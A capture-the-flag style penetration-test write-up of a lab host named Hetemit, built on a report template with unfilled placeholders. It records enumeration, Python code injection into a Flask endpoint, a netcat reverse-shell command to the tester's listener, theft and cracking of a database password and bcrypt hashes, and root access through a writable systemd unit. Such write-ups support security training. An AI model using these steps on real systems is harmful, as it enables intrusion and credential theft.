# Hetemit
## Table of Contents
* [Executive Summary](#executive-summary)
  * [Attack Vectors](#attack-vectors)
  * [Recommendations](#recommendations)
* [Methodology](#methodology)
  * [Reconnaissance](#reconnaissance)
  * [Enumeration](#enumeration)
  * [Gaining Access](#gaining-access)
  * [Maintaining Access](#maintaining-access)
  * [Covering Tracks](#covering-tracks)
* [Additional Items](#additional-items)

# Executive Summary
On $Date, $Author performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the $DomainName domain. During the penetration test, $Author was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| $CveIdNumber | $EdbIdNumber |

## Recommendations
$Author recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
$Author used a widely-adopted and phased approach for the penetration test. This included reconnaissance, enumeration, gaining access, maintaining access, and covering his tracks. Below is an outline of $Author's activities and serves to demonstrate how he identified and exploited a variety of information systems across the Offensive Security exam network.

## Reconnaissance
The purpose of the reconnaissance phase of a penetration test is to identify information and sytems that represent the organization online and then, discover possible attack vectors. For this penetration test, $Author was asked to narrow his information gathering objectives to collecting the details below. 

### General Information
* Hostname: hetemit 
* Description: Hetemit - The Goddess of Destruction
* IP Address: 
* MAC Address: (ref:) 
* Domain: WORKGROUP
* Distro: (ref:)
* Kernel: (ref:)
* Architecture: (ref:)

### Ports
```bash
# Nmap 7.91 scan initiated Thu Aug 19 21:59:42 2021 as: nmap -sS -sU -p- --min-rate 1000 -oN scans/hetemit-nmap-complete 192.168.59.117
Nmap scan report for 192.168.59.117
Host is up (0.068s latency).
Not shown: 65535 open|filtered ports, 65528 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
18000/tcp open  biimenu
50000/tcp open  ibm-db2

# Nmap done at Thu Aug 19 22:03:41 2021 -- 1 IP address (1 host up) scanned in 239.16 seconds
```

### Service Versions
```bash
# Nmap 7.91 scan initiated Thu Aug 19 22:06:11 2021 as: nmap -sV -sC -pT:21,22,80,139,445,18000,50000 -oN scans/hetemit-nmap-versions 192.168.59.117
Nmap scan report for 192.168.59.117
Host is up (0.070s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.49.59
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
|_  256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)
80/tcp    open  http        Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
18000/tcp open  biimenu?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port18000-TCP:V=7.91%I=7%D=8/19%Time=611F0E1A%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(GetReque
SF:st,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;\x2
SF:0charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!DOCTYPE\x20html>\n<h
SF:tml\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"utf-8\"\x20/>\n
SF:\x20\x20<title>Action\x20Controller:\x20Exception\x20caught</title>\n\x
SF:20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20backg
SF:round-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\n\x20
SF:\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x20font-f
SF:amily:\x20helvetica,\x20verdana,\x20arial,\x20sans-serif;\n\x20\x20\x20
SF:\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x20\x20\x20\x20line-h
SF:eight:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x20\x2
SF:0\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x20\x20\x20white-spa
SF:ce:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\x20{\n\
SF:x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#EEE;\n\x20\x20\x20\x
SF:20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\
SF:x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x20\x20}\n\n\x20\x20\
SF:x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n\x20\x2
SF:0\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20paddi
SF:ng:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h1\x20{\
SF:n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x20\x20\x20\x20\x20\
SF:x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20font-size:\x202em;\
SF:n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\x20\x20\x20\x20\x20
SF:color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-height:\x2025px;\n\x20
SF:\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x20\x20\x20\x20\x20\x
SF:20bord")%r(HTTPOptions,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Ty
SF:pe:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!
SF:DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20chars
SF:et=\"utf-8\"\x20/>\n\x20\x20<title>Action\x20Controller:\x20Exception\x
SF:20caught</title>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20c
SF:olor:\x20#333;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x
SF:20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x
SF:20\x20\x20\x20font-family:\x20helvetica,\x20verdana,\x20arial,\x20sans-
SF:serif;\n\x20\x20\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x
SF:20\x20\x20\x20line-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20pre\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\
SF:x20\x20\x20white-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20
SF:\x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#
SF:EEE;\n\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x
SF:20margin:\x200px;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x
SF:20\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\
SF:x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\
SF:x20\x20\x20\x20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20
SF:\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\
SF:x20\x20\x20\x20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x2
SF:0font-size:\x202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20
SF:\x20\x20\x20\x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-he
SF:ight:\x2025px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x
SF:20\x20\x20\x20\x20\x20bord");
Service Info: OS: Unix

Host script results:
|_clock-skew: -2s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-20T02:06:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 19 22:07:04 2021 -- 1 IP address (1 host up) scanned in 53.20 seconds
```

### Operating System
```bash
# Nmap 7.91 scan initiated Thu Aug 19 22:09:49 2021 as: nmap -O -oN scans/hetemit-nmap-os 192.168.59.117
Nmap scan report for 192.168.59.117
Host is up (0.069s latency).
Not shown: 994 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|3.X|5.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.1
Aggressive OS guesses: Linux 4.4 (91%), Linux 3.10 - 3.12 (89%), Linux 4.9 (89%), Linux 3.10 - 3.16 (86%), Linux 4.0 (86%), Linux 3.10 - 4.11 (85%), Linux 3.11 - 4.1 (85%), Linux 3.18 (85%), Linux 3.2 - 4.9 (85%), Linux 5.1 (85%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 19 22:09:58 2021 -- 1 IP address (1 host up) scanned in 9.44 seconds
```

## Enumeration
The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

### FTP
```bash
ftp 192.168.59.117 21

# output
Connected to 192.168.59.117.
220 (vsFTPd 3.0.3)
Name (192.168.59.117:victor): anonymous
331 Please specify the password.
Password: # anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

```bash
ls

# output
200 PORT command successful. Consider using PASV.
```

### HTTP
#### TCP Port 80
```bash
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: scans/hetemit-dirb-80-common
START_TIME: Thu Aug 19 22:00:32 2021
URL_BASE: http://192.168.59.117/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.59.117/ ----
+ http://192.168.59.117/cgi-bin/ (CODE:403|SIZE:217)
==> DIRECTORY: http://192.168.59.117/noindex/

---- Entering directory: http://192.168.59.117/noindex/ ----
==> DIRECTORY: http://192.168.59.117/noindex/common/
+ http://192.168.59.117/noindex/index (CODE:200|SIZE:4006)
+ http://192.168.59.117/noindex/index.html (CODE:200|SIZE:4006)

---- Entering directory: http://192.168.59.117/noindex/common/ ----
==> DIRECTORY: http://192.168.59.117/noindex/common/css/
==> DIRECTORY: http://192.168.59.117/noindex/common/fonts/
==> DIRECTORY: http://192.168.59.117/noindex/common/images/
```

#### TCP Port 18000
```bash
[22:30:48] Starting: 
[22:31:50] 200 -    2KB - /404                                                                            
[22:31:50] 200 -    2KB - /404.html                             
[22:31:50] 200 -    2KB - /500                             
[22:35:05] 200 -    0B  - /favicon.ico                                                                                       
[22:35:51] 200 -    2KB - /login                                                                                               
[22:35:51] 200 -    2KB - /login.php                             
[22:35:51] 200 -    2KB - /login.aspx                                    
[22:35:51] 200 -    2KB - /login.html
[22:35:51] 200 -    2KB - /login.jsp
[22:35:51] 200 -  476B  - /login.js
[22:35:51] 200 -    2KB - /login.cgi
[22:35:51] 200 -    2KB - /login.asp
[22:35:51] 200 -    2KB - /login.htm
[22:35:51] 200 -    2KB - /login.py
[22:35:51] 200 -    2KB - /login.pl
[22:35:51] 200 -    2KB - /login.rb
[22:35:51] 200 -    2KB - /login.shtml
[22:35:51] 200 -    2KB - /login.wdm%20
[22:35:51] 200 -    2KB - /login.srf
[22:35:51] 200 -    2KB - /login/                                        
[22:35:51] 406 -  100KB - /login.json                           
[22:35:54] 302 -   99B  - /logout  ->  http://192.168.59.117:18000/login
[22:35:54] 302 -   99B  - /logout.php  ->  http://192.168.59.117:18000/login
[22:35:54] 302 -   99B  - /logout.aspx  ->  http://192.168.59.117:18000/login
[22:35:54] 302 -   99B  - /logout.jsp  ->  http://192.168.59.117:18000/login
[22:35:54] 302 -   99B  - /logout.html  ->  http://192.168.59.117:18000/login
[22:35:54] 302 -   99B  - /logout.js  ->  http://192.168.59.117:18000/login
[22:35:54] 302 -   99B  - /logout/  ->  http://192.168.59.117:18000/login
[22:35:57] 302 -   99B  - /logout.asp  ->  http://192.168.59.117:18000/login
[22:36:54] 200 -    2KB - /rails/info/properties                                                                        
[22:37:00] 200 -   99B  - /robots.txt                                                                                    
[22:37:48] 302 -   99B  - /users.php  ->  http://192.168.59.117:18000/login                                                   
[22:37:48] 302 -   99B  - /users.aspx  ->  http://192.168.59.117:18000/login
[22:37:48] 302 -   99B  - /users.csv  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users.ini  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users.json  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users.mdb  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users.pwd  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users.sql  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users.txt  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users.xls  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users.sqlite  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users/  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users/login  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users/admin.php  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users/admin  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users/login.php  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users/login.aspx  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users/login.jsp  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users/login.html  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users/login.js  ->  http://192.168.59.117:18000/login
[22:37:49] 302 -   99B  - /users  ->  http://192.168.59.117:18000/login
[22:37:50] 302 -   99B  - /users.jsp  ->  http://192.168.59.117:18000/login
[22:37:50] 302 -   99B  - /users.html  ->  http://192.168.59.117:18000/login
[22:37:50] 302 -   99B  - /users.js  ->  http://192.168.59.117:18000/login
[22:37:50] 302 -   99B  - /users.db  ->  http://192.168.59.117:18000/login 
[22:37:51] 302 -   99B  - /users.log  ->  http://192.168.59.117:18000/login
```

```bash
firefox http://192.168.59.117:18000

# output
Rails version   6.0.3.4
Ruby version    ruby 2.6.3p62 (2019-04-16 revision 67580) [x86_64-linux]
RubyGems version        3.0.8
Rack version    2.2.3
Middleware

    Webpacker::DevServerProxy
    ActionDispatch::HostAuthorization
    Rack::Sendfile
    ActionDispatch::Static
    ActionDispatch::Executor
    ActiveSupport::Cache::Strategy::LocalCache::Middleware
    Rack::Runtime
    Rack::MethodOverride
    ActionDispatch::RequestId
    ActionDispatch::RemoteIp
    Sprockets::Rails::QuietAssets
    Rails::Rack::Logger
    ActionDispatch::ShowExceptions
    WebConsole::Middleware
    ActionDispatch::DebugExceptions
    ActionDispatch::ActionableExceptions
    ActionDispatch::Reloader
    ActionDispatch::Callbacks
    ActiveRecord::Migration::CheckPending
    ActionDispatch::Cookies
    ActionDispatch::Session::CookieStore
    ActionDispatch::Flash
    ActionDispatch::ContentSecurityPolicy::Middleware
    Rack::Head
    Rack::ConditionalGet
    Rack::ETag
    Rack::TempfileReaper

Application root        /home/cmeeks/register_hetemit
Environment     development
Database adapter        postgresql
Database schema version 20201112191834
```

#### TCP Port 50000
```bash
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: scans/hetemit-dirb-50000-common
START_TIME: Thu Aug 19 22:24:37 2021
URL_BASE: http://192.168.59.117:50000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.59.117:50000/ ----

-----------------
END_TIME: Thu Aug 19 22:36:00 2021
DOWNLOADED: 4612 - FOUND: 0
```

```bash
curl http://192.168.59.117:50000

# output
{'/generate', '/verify'}
```

```bash
curl http://192.168.59.117:5000/generate

# output
{'email@domain'}
```

```bash
curl -X POST http://192.168.59.117:5000/generate -d "email=victor@pwn.edu"

# output
ef960c556e9c039a75c594cd192d95625d030d6cf69fdaa32591ffb74e00d3a0
```

```bash
curl -X POST http://192.168.59.117:5000/verify

# output
{'code'}
```

```bash
curl -X POST http://192.168.59.117:5000/verify -d "code=1234"

# output
1234
```

### SMB
```bash
smbclient -L 192.168.59.117
Enter WORKGROUP\victor's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Cmeeks          Disk      cmeeks Files
        IPC$            IPC       IPC Service (Samba 4.11.2)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

```bash
smbclient //192.168.59.117/cmeeks

# output
Enter WORKGROUP\victor's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```

## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, $Author was able to successfully gain access to 10 out of the 50 systems.

```bash
curl -X POST http://192.168.59.117:5000/verify -d "code=2*2"

# output
4
```

```bash
curl -X POST http://192.168.59.117:50000/verify -d "code=os.getcwd()"

# output
/home/cmeeks/restjson_hetemit
```

```bash
sudo nc -nvlp 50000
curl -X POST http://192.168.59.117:50000/verify -d "code=os.system('nc 192.168.49.59 50000 -e /bin/bash')"
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. $Author added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.

### Privilege Escalation
```bash
whereis python

# output
python: /usr/bin/python3.6 /usr/bin/python3.6m /usr/lib/python3.6 /usr/lib64/python3.6 /usr/local/lib/python3.6 /usr/include/python3.6m /usr/share/man/man1/python.1.gz
````

```bash
/usr/bin/python3.6 -c "import pty; pty.spawn('/bin/bash');"
export TERM=xterm
```

```bash
whoami

# output
cmeeks
```

```bash
id 

# output
uid=1000(cmeeks) gid=1000(cmeeks) groups=1000(cmeeks)
```

```bash
uname -a 

# output
Linux hetemit 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
netstat -pant

# output
# ...snipped...
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -
# ...snipped..
```

```bash
psql -U postgres -p 5432 -h 127.0.0.1

# output
Password for user postgres: postgres
psql: FATAL:  password authentication failed for user "postgres"
```

```bash
cd register_hetemit/config/
cat database.yml

# output
default: &default
  adapter: postgresql
  encoding: unicode
  # For details on connection pooling, see Rails configuration guide
  # https://guides.rubyonrails.org/configuring.html#database-pooling
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>

development:
  <<: *default
  database: register_hetemit
  username: railsdev
  password: OpenProduceTreat153
```

```bash
# psql commands
\l # list all databases
\dt # list tables of current database
\x # turn on expanded display
TABLE <table_name>; # show contents of a table
\q # exit session
```

```bash
psql -U railsdev -p 5432 -h 127.0.0.1 -d register_hetemit 
# railsdev:OpenProduceTreat153

TABLE users;

# output
(0 rows)
```

```bash
su postgres
Password: OpenProduceTreat153

# output
su: Authentication failure
```

```bash
cat development.log | grep password_digest | awk -F 'password_digest' '{print $3}' | cut -d, -f2 | cut -d] -f1 | tr -d ' '

# output
$2a$12$u8pzr7GafCt2feEKGChHM.w/iu7zii6x9SXmXqgqpYg1CbJcAsS3O
$2a$12$59HpnfnNKIxpZoyZHY7PPel8sLFqaOBx6X.IFAsvGTwKidUDjVfNO
$2a$12$YjUfD0ILSfReOUv507.cD.g3UWpvDdgDlow9uBUKC5YALfFDZdpGG
```

```bash
cd loot
vim hashes.txt
$2a$12$u8pzr7GafCt2feEKGChHM.w/iu7zii6x9SXmXqgqpYg1CbJcAsS3O
$2a$12$59HpnfnNKIxpZoyZHY7PPel8sLFqaOBx6X.IFAsvGTwKidUDjVfNO
$2a$12$YjUfD0ILSfReOUv507.cD.g3UWpvDdgDlow9uBUKC5YALfFDZdpGG
```

```bash
hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# output
$2a$12$YjUfD0ILSfReOUv507.cD.g3UWpvDdgDlow9uBUKC5YALfFDZdpGG:myself
$2a$12$u8pzr7GafCt2feEKGChHM.w/iu7zii6x9SXmXqgqpYg1CbJcAsS3O:myself
$2a$12$59HpnfnNKIxpZoyZHY7PPel8sLFqaOBx6X.IFAsvGTwKidUDjVfNO:myself
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: hashes.txt
Time.Started.....: Sat Aug 21 02:31:15 2021 (2 mins, 2 secs)
Time.Estimated...: Sat Aug 21 02:33:17 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       21 H/s (5.77ms) @ Accel:4 Loops:32 Thr:1 Vec:8
Recovered........: 3/3 (100.00%) Digests, 3/3 (100.00%) Salts
Progress.........: 2592/43033155 (0.01%)
Rejected.........: 0/2592 (0.00%)
Restore.Point....: 848/14344385 (0.01%)
Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:4064-4096
Candidates.#1....: peewee -> felipe

Started: Sat Aug 21 02:30:45 2021
Stopped: Sat Aug 21 02:33:19 2021
```

The logins below did not work against the web app listening TCP port 18000 or within the operating system. 
```bash
alexertech:myself
alexertech:myself
test:myself
cmeeks:myself
postgres:myself
root:myself
```

```bash
find /etc -type f -perm /g=w -exec ls -l {} + 2> /dev/null

# output
-rw-rw-r-- 1 root cmeeks 331 Aug 21 07:32 /etc/systemd/system/pythonapp.service
```

```bash
cat /etc/systemd/system/pythonapp.service

# output
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

```bash
cat /etc/systemd/system/pythonapp.service > /tmp/pythonapp.service
sed -i "/User=/c\User=root" /tmp/pythonapp.service
sed -i "/ExecStart=/c\ExecStart=useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 -m victor" /tmp/pythonapp.service
cat /tmp/pythonapp.service > /etc/systemd/system/pythonapp.service
sudo reboot
```

```bash
ssh victor@192.168.59.117 # victor:password
id

# output
uid=0(root) gid=0(root) groups=0(root)
```

## Covering Tracks
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important. After the trophies on both the lab network and exam network were completed, $Author removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items
## Lessons Learned
* Use multiple tools
